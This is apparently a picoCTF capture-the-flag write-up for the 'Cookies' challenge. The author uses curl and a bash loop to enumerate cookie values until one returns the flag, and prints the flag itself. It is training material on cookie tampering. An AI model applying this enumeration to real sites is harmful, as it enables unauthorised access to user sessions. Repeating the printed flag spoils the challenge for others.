I was given a task to find the "best" cookie on a challenge site.

The first thing I did was use `curl` to check for any cookies set by the server.

By sending a `GET` request to the URL, I found that the server set a cookie called "name" with the value `-1`.

From there, I tried modifying the cookie and iterated through a range of values, hoping to find one that returned something different from the default response.

When I set the cookie value to `0` and made the request, the response said that the cookie wasn’t special, so I continued testing with a loop.

After trying values from 1 to 20, I found that when the value was set to `18`, the response changed significantly.

It mentioned a flag and provided a clear hint, so I knew that was the one I was looking for; the flag.

It was a fun exercise of interacting with the server via cookies and figuring out which one was "special".

Code:
```
root@LAPTOP-GEM5SRL1:~# curl -s http://mercury.picoctf.net:54219/ -I | grep Cookie
Set-Cookie: name=-1; Path=/
root@LAPTOP-GEM5SRL1:~# curl -s http://mercury.picoctf.net:54219/ -H "Cookie: name=0;" -L | grep -i Cookie
    <title>Cookies</title>
            <h3 class="text-muted">Cookies</h3>
          <!-- <strong>Title</strong> --> That is a cookie! Not very special though...
            <p style="text-align:center; font-size:30px;"><b>I love snickerdoodle cookies!</b></p>
root@LAPTOP-GEM5SRL1:~# for i in {1..20}; do
> for>     contents=$(curl -s http://mercury.picoctf.net:27177/ -H "Cookie: name=$i; Path=/" -L)
for>     if ! echo "$contents" | grep -q "Not very special"; then
for then>         echo "Cookie #$i is special"
for then>         echo $contents | grep "pico"
for then>         break
for then>     fi
for> done
-bash: syntax error near unexpected token `>'
-bash: syntax error near unexpected token `>'
-bash: syntax error near unexpected token `>'
-bash: syntax error near unexpected token `>'
-bash: syntax error near unexpected token `>'
-bash: syntax error near unexpected token `>'
-bash: syntax error near unexpected token `>'
root@LAPTOP-GEM5SRL1:~# for i in {1..20}; do
> contents=$(curl -s http://mercury.picoctf.net:54219/ -H "Cookie: name=$i; Path=/" -L)
> if ! echo "$contents" | grep -q "Not very special"; then
> echo "Cookie #$i is special"
> echo $contents | grep "pico"
> break
> fi
> done
Cookie #18 is special
<!DOCTYPE html> <html lang="en"> <head> <title>Cookies</title> <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet"> <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet"> <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script> <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script> </head> <body> <div class="container"> <div class="header"> <nav> <ul class="nav nav-pills pull-right"> <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Home</a> </li> </ul> </nav> <h3 class="text-muted">Cookies</h3> </div> <div class="jumbotron"> <p class="lead"></p> <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}</code></p> </div> <footer class="footer"> <p>&copy; PicoCTF</p> </footer> </div> </body> </html>
root@LAPTOP-GEM5SRL1:~#
```

![Screenshot (754)](https://github.com/user-attachments/assets/47241a5c-1d86-4b46-bec0-9c85c06ba90a)


![Screenshot (1266)](https://github.com/user-attachments/assets/362c99c7-e5df-4846-9595-06891b3a4472)


**picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}**
